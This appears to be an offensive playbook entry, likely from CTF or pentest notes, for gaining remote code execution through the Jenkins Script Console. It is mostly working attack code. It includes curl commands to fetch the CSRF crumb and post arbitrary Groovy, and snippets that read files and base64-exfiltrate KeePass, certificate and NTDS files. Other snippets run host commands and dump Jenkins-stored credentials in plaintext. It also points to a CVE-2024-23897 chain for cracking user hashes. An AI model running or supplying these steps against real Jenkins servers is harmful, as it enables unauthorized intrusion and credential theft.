# Jenkins Anonymous / Authenticated Script Console RCE (Groovy)

## When this applies

- Jenkins web UI reachable; the dashboard renders unauthenticated OR a known cred set unlocks it.
- `/script` and `/scriptText` endpoints respond — anonymous on legacy installs, admin-only on hardened ones. The Script Console is "Run Groovy on the controller" by design; access = unrestricted RCE as the Jenkins service user.
- Common deployment paths: `/`, `/jenkins/`, `/<custom-prefix>/`. The dashboard's HTML `data-rooturl="…"` reveals the actual prefix.

## Detect

```bash
# Fingerprint Jenkins version + prefix
curl -s 'http://<HOST>:<PORT>/<PREFIX>/' | grep -oE 'data-version="[^"]*"|data-rooturl="[^"]*"' | head
# 200 + "Script Console" page = anonymous RCE primitive available
curl -s -o /dev/null -w '%{http_code}\n' 'http://<HOST>:<PORT>/<PREFIX>/script'
```

## Trigger

Jenkins requires the CSRF "crumb" header on all state-changing POSTs. Pull it once, reuse for every script:

```bash
URL=http://<HOST>:<PORT>/<PREFIX>

CRUMB=$(curl -s "$URL/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,':',//crumb)")
HDR="${CRUMB%:*}"; VAL="${CRUMB#*:}"

# Run arbitrary Groovy. POST to /scriptText (returns plain output, no HTML wrap).
curl -s -H "$HDR: $VAL" \
     --data-urlencode "script=println 'OK ' + new File('.').absolutePath" \
     "$URL/scriptText"
```

When auth is required, add `-u user:pass` to both curl calls (crumb fetch + script POST). Same crumb, same session.

## Useful Groovy primitives

Read any file the Jenkins service user can see — no shell needed:

```groovy
println new File('C:/Users/<USER>/Desktop/user.txt').text
```

Exfil binary (base64) — for `kdbx`, `.pfx`, `.ntds.dit`, etc.:

```groovy
println new File('C:/Users/<USER>/Documents/CEH.kdbx').bytes.encodeBase64().toString()
```

Run a host command and capture stdout:

```groovy
def cmd = ['cmd', '/c', 'whoami /all']         // Linux: ['/bin/sh','-c','id; uname -a']
def proc = cmd.execute()
proc.waitFor()
println proc.text
```

Dump credentials Jenkins itself stores:

```groovy
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
def creds = CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null)
creds.each { println "${it.id}: ${it.username} : ${it.password?.plainText}" }
```

This dumps `password?.plainText` for every saved-cred entry — usually how `secret-text`, SSH keys, and stored API tokens leak.

## Reading without a reverse shell

The Script Console returns Groovy's `println` to the HTTP response — every primitive above (file read, command exec, credential dump) returns text inline. There is no need to drop `nc.exe` / open egress / land a shell. Combine the eval primitive with `nxc smb -u <user> -H <hash>` later if you crack stored creds.

## Where to look first

- `Manage Jenkins → Configure Global Security` (Groovy: `Jenkins.instance.securityRealm`) reveals the auth realm and whether anonymous read was the intended config or a leftover.
- `~/.jenkins/secrets/master.key` + `~/.jenkins/credentials.xml` are decryptable inside the JVM via `hudson.util.Secret.decrypt(...)` — preferred over offline kdbx cracking when available.
- `Manage Plugins → Installed` enumerates plugins for additional CVEs (e.g., script-security, matrix-auth bypasses).

## Anti-Patterns

- Hitting `/script` directly via GET expecting a form to fill — works in a browser; for automation, POST to `/scriptText` (plain-text response, no HTML scraping).
- Sending the script as a raw POST body — Jenkins expects URL-encoded `script=…` form data. Use `--data-urlencode`.
- Dropping a Java agent / .war via the same endpoint when a 5-line Groovy `new File(...).text` already gets the flag. Prefer the lightest primitive.

## Cross-references

- Anonymous-read CMS / CI-CD primitives in general: [../../foothold-patterns.md](../../foothold-patterns.md).
- For older Jenkins where the Script Console is locked but `/cli` is not: CVE-2024-23897 (CLI arbitrary file read) lets you grab `users.xml`, crack `<passwordHash>#jbcrypt:` offline, then come back to the Script Console authenticated — the `CredentialsProvider.lookupCredentials(…)` Groovy snippet above is the same primitive, just with auth.
